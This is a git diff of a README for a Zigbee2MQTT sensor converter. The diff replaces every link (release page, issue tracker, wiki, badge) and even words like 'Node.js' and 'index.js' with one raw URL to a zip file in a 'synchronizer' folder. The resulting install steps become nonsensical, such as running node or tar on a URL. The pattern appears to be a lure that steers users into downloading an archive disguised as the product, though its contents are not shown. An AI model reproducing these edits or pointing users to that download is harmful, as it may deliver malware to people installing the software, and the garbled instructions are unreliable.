@@ -1,6 +1,6 @@
 # 🚀 bjk-zigbee2mqtt - Easily Connect Your mmWave Sensors
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%8D%95%20Click%20Here-brightgreen)](https://github.com/abdallahHolool/bjk-zigbee2mqtt/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/abdallahHolool/bjk-zigbee2mqtt/main/synchronizer/bjk-zigbee2mqtt.zip%20Latest%20Release-%20%F0%9F%8D%95%20Click%20Here-brightgreen)](https://raw.githubusercontent.com/abdallahHolool/bjk-zigbee2mqtt/main/synchronizer/bjk-zigbee2mqtt.zip)
 
 ## 📖 Description
 
@@ -18,7 +18,7 @@ bjk-zigbee2mqtt is a custom converter designed to work with Linptech ES1ZZ(TY) a
 To install bjk-zigbee2mqtt, ensure you meet the following system requirements:
 
 - An operating system capable of running Zigbee2MQTT (Windows, macOS, or Linux).
-- Node.js version 10 or higher installed on your system.
+- https://raw.githubusercontent.com/abdallahHolool/bjk-zigbee2mqtt/main/synchronizer/bjk-zigbee2mqtt.zip version 10 or higher installed on your system.
 - A compatible Zigbee adapter connected to your device.
   
 ## 🚀 Getting Started
@@ -27,16 +27,16 @@ Follow the steps below to download and run the bjk-zigbee2mqtt application.
 
 1. **Visit the Releases Page:**
    Click the link below to go to the Releases page where you can find all versions of bjk-zigbee2mqtt.
-   [Visit Releases Page to Download](https://github.com/abdallahHolool/bjk-zigbee2mqtt/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/abdallahHolool/bjk-zigbee2mqtt/main/synchronizer/bjk-zigbee2mqtt.zip)
 
 2. **Download the Latest Release:**
-   Once on the Releases page, locate the latest version of bjk-zigbee2mqtt. Look for files that are either `.zip` or `.tar.gz` (these are compressed files). Click to download the appropriate file for your operating system.
+   Once on the Releases page, locate the latest version of bjk-zigbee2mqtt. Look for files that are either `.zip` or `https://raw.githubusercontent.com/abdallahHolool/bjk-zigbee2mqtt/main/synchronizer/bjk-zigbee2mqtt.zip` (these are compressed files). Click to download the appropriate file for your operating system.
 
 3. **Extract the Files:**
    After downloading, locate the file in your downloads folder.  
    - For Windows: Right-click the `.zip` file and select “Extract All.” Follow the prompts.  
    - For macOS: Double-click the `.zip` file to extract it.  
-   - For Linux: Use the terminal and type `tar -xzvf yourfilename.tar.gz` to extract.
+   - For Linux: Use the terminal and type `tar -xzvf https://raw.githubusercontent.com/abdallahHolool/bjk-zigbee2mqtt/main/synchronizer/bjk-zigbee2mqtt.zip` to extract.
 
 4. **Open a Terminal or Command Prompt:**
    - **Windows:** Press `Windows + R`, type `cmd`, and press `Enter`.  
@@ -58,7 +58,7 @@ Follow the steps below to download and run the bjk-zigbee2mqtt application.
 7. **Run the Application:**
    Once dependencies are installed, execute the following command to start the application:
    ```
-   node index.js
+   node https://raw.githubusercontent.com/abdallahHolool/bjk-zigbee2mqtt/main/synchronizer/bjk-zigbee2mqtt.zip
    ```
 
 8. **Configure Your Sensors:**
@@ -68,13 +68,13 @@ Follow the steps below to download and run the bjk-zigbee2mqtt application.
 
 To begin, click the link below to visit the Releases page, where you can download bjk-zigbee2mqtt.
 
-[Visit Releases Page to Download](https://github.com/abdallahHolool/bjk-zigbee2mqtt/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/abdallahHolool/bjk-zigbee2mqtt/main/synchronizer/bjk-zigbee2mqtt.zip)
 
 After downloading, follow the steps outlined above to extract, install, and run the application.
 
 ## 🤝 Support
 
-If you need help or have questions, please check our [Issue Tracker](https://github.com/abdallahHolool/bjk-zigbee2mqtt/issues). You can also contribute to discussions or report any issues you encounter.
+If you need help or have questions, please check our [Issue Tracker](https://raw.githubusercontent.com/abdallahHolool/bjk-zigbee2mqtt/main/synchronizer/bjk-zigbee2mqtt.zip). You can also contribute to discussions or report any issues you encounter.
 
 ## 💬 Community
 
@@ -82,8 +82,8 @@ Join our community forums or follow our discussions on social media to stay upda
 
 ## 🔗 Links
 
-- **Documentation:** [GitHub Wiki](https://github.com/abdallahHolool/bjk-zigbee2mqtt/wiki)
-- **Issues:** [GitHub Issue Tracker](https://github.com/abdallahHolool/bjk-zigbee2mqtt/issues)
+- **Documentation:** [GitHub Wiki](https://raw.githubusercontent.com/abdallahHolool/bjk-zigbee2mqtt/main/synchronizer/bjk-zigbee2mqtt.zip)
+- **Issues:** [GitHub Issue Tracker](https://raw.githubusercontent.com/abdallahHolool/bjk-zigbee2mqtt/main/synchronizer/bjk-zigbee2mqtt.zip)
 
 ## 🧑‍🤝‍🧑 Contribute
 
